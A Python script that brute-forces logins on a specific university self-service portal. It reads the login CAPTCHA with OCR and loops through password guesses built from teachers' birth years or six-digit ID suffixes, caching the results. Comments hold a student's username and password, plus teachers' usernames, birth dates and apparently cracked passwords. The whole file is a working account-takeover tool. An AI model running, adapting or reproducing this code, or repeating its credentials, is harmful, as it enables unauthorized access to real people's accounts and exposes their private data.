#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Feb 11 21:13:02 2017
@author: yiyuezhuo
"""

import requests
import webbrowser
from PIL import Image
import pytesseract
from bs4 import BeautifulSoup
import json
import os



def fff(html_or_res, temp_name = 'temp.html', encoding='gbk'):
    
    if not isinstance(html_or_res, str):
        html = html_or_res.content.decode(encoding)
    else:
        html = html_or_res
    
    with open(temp_name, 'w') as f:
        f.write(html)
    webbrowser.open(temp_name)
    
def parse_input(html, key_name = 'id', value_name = 'value'):
    soup = BeautifulSoup(html,'lxml')
    rd = {}
    for inp in soup.select('input'):
        try:
            rd[inp.attrs[key_name]] = inp.attrs[value_name]
        except KeyError:
            pass
    return rd

def parse_headers(doc):
    rd = {}
    for line in doc.split('\n'):
        index = line.index(':')
        rd[line[:index]] = line[index+1:]
    return rd

'''
__EVENTTARGET:
__EVENTARGUMENT:
__VIEWSTATE:/wEPDwULLTE5NTcyNTM1NTgPZBYCAgMPZBYCAgMPZBYCAgEPEGQPFgFmFgEFCeeUqOaIt+WQjWRkZCgRl09RnTlO4CZ3r3VtaXrTtZ6s
__EVENTVALIDATION:/wEWCQKet6aeAwLi7PPUAQL97PPUAQLyg9m6DQKl1bKzCQKd+7qdDgKY2YWXBgKTgvWHDQLJk9/kDPzc3vVICSg1NSXRbCPlB8cdomR/
rbl_user:0
txtUserName:2014060842
txtPwd:241213
txtCheckCode:4507
btnUserLogin:
'''

fake_headers3 = '''Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding:gzip, deflate
Accept-Language:en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4
Cache-Control:max-age=0
Connection:keep-alive
Content-Length:363
Content-Type:application/x-www-form-urlencoded
Cookie:ASP.NET_SessionId=pg35bne531t33g45u20ucdvp
Host:202.115.192.98
Origin:http://202.115.192.98
Referer:http://202.115.192.98/SelfSearch/UserInfo/UserLogin.aspx
Upgrade-Insecure-Requests:1
User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'''
headers3 = parse_headers(fake_headers3)
del headers3['Cookie']
del headers3['Content-Length']

def fill_data(__EVENTTARGET = '', __EVENTARGUMENT = '',
              __VIEWSTATE = '', __EVENTVALIDATION = '',
              rbl_user = '0',txtUserName = '',
              txtPwd = '', txtCheckCode = '',
              btnUserLogin = ''):
    dic = {}
    dic['__EVENTTARGET'] = __EVENTTARGET
    dic['__EVENTARGUMENT'] = __EVENTARGUMENT
    dic['__VIEWSTATE'] = __VIEWSTATE # important
    dic['__EVENTVALIDATION'] = __EVENTVALIDATION # important
    dic['rbl_user'] = rbl_user
    dic['txtUserName'] = txtUserName
    dic['txtPwd'] = txtPwd
    dic['txtCheckCode'] = txtCheckCode
    dic['btnUserLogin'] = btnUserLogin
    return dic
       
    
with open('mapcsv.csv',encoding='gbk') as f:
    lines = f.readlines()
    lines = [line.split(',')[:3] for line in lines]
d = {line[1]:line for line in lines if len(line) == 3}
    
url  = 'http://202.115.192.98/SelfSearch/UserInfo/UserLogin.aspx'
url2 = 'http://202.115.192.98/SelfSearch/Other/pic.aspx'
url3 = 'http://202.115.192.98/SelfSearch/UserInfo/UserLogin.aspx'


def enter(username, password):
    sess = requests.session()
    res = sess.get(url)
    def login():
        res2 = sess.get(url2)
        
        with open('temp.bmp','wb') as f:
            f.write(res2.content)
        im = Image.open('temp.bmp')
        code = pytesseract.image_to_string(im.copy())
        im.close()
        
        #username = '2014060842'
        #password = '241213'
        
        hidden = parse_input(res.content.decode('gbk'))
        data = fill_data(txtUserName = username, txtPwd = password,
                          txtCheckCode = code, 
                          __VIEWSTATE = hidden['__VIEWSTATE'],
                          __EVENTVALIDATION = hidden['__EVENTVALIDATION'])
        
        res3 = sess.post(url3, headers = headers3, data = data)
        return res3.content.decode('gbk')
    return login

def classify(html):
    rd = {}
    rd['password_error'] = '输入的用户密码错误！' in html
    rd['code_null'] = '请输入验证码！！！' in html
    rd['code_error'] = '输入的验证码错误！'  in html 
    return rd

def password_dump(username, password_set, verbose = True, callback = None,
                  prev_rd = None):
    if prev_rd:
        rd = prev_rd
    else:
        rd = {password : None for password in password_set}
    
    try:
        for password in password_set:
            if rd[password] == True:
                if verbose:
                    print('skip: {} {} is not True'.format(username, password))
                continue
            login = enter(username, password)
            while True:
                state = classify(login())
                if state['code_error'] == True or state['code_null'] == True:
                    continue
                rd[password] = state['password_error']
                if verbose:
                    print('{} {} is not {}'.format(username, password, state['password_error']))
                if callback:
                    callback(rd)
                break
    except KeyboardInterrupt:
        pass
    return rd
    
def password_dump_cache(username, password_set, cache_name = None,
                        ignore_cache =  False, prev_rd = None, 
                        verbose = True):
    if cache_name is None:
        cache_name = '{}.json'.format(username)
    
    if not ignore_cache:
        if os.path.exists(cache_name):
             with open(cache_name) as f:
                 prev_rd = json.load(f)
    
    def _callback(rd):
        with open(cache_name,'w') as f:
            json.dump(rd,f)
    
    return password_dump(username, password_set, 
                         callback = _callback, prev_rd = prev_rd,
                         verbose = verbose)
    
def password_dump_teacher(teacher_list):
    for username, birth in teacher_list:
        password_set = [birth[-2:]+str(n).zfill(4) for n in range(0,10000)]
        password_dump_cache(username, password_set)
        
def password_dump_six(teacher_list, verbose = True):
    # ID last six digit
    for username in teacher_list:
        password_set = [str(n).zfill(6) for n in range(10000,320000)]
        password_dump_cache(username, password_set, verbose = verbose)
        
def report_cache(teacher_list):
    td = {}
    if not isinstance(teacher_list[0], (str,int,float)):
        teacher_list = zip(*teacher_list)[0]
    for username in teacher_list:
        with open('{}.json'.format(username)) as f:
            info = json.load(f)
            td[username] = [(key,value) for key,value in info.items() if not value]
            print('{}: {}/{}'.format(username, len(td[username]), len(info)))
    return td

'''
sess = requests.session()
res = sess.get(url)
res2 = sess.get(url2)
with open('temp.bmp','wb') as f:
    f.write(res2.content)
im = Image.open('temp.bmp')
code = pytesseract.image_to_string(im.copy())
im.close()
username = '2014060842'
password = '241213'
hidden = parse_input(res.content.decode('gbk'))
data = fill_data(txtUserName = username, txtPwd = password,
                  txtCheckCode = code, 
                  __VIEWSTATE = hidden['__VIEWSTATE'],
                  __EVENTVALIDATION = hidden['__EVENTVALIDATION'])
res3 = sess.post(url3, headers = headers3, data = data)
res3.content.decode('gbk')
'''

'''
username birth password
20010092 19640609 092149
19980082 19630904 040420
19930026 19680401 None
password_dump_teacher([('20010092', '19640609'),
                       ('19980082', '19630904'),
                       ('19930026', '19680401')])
    
'''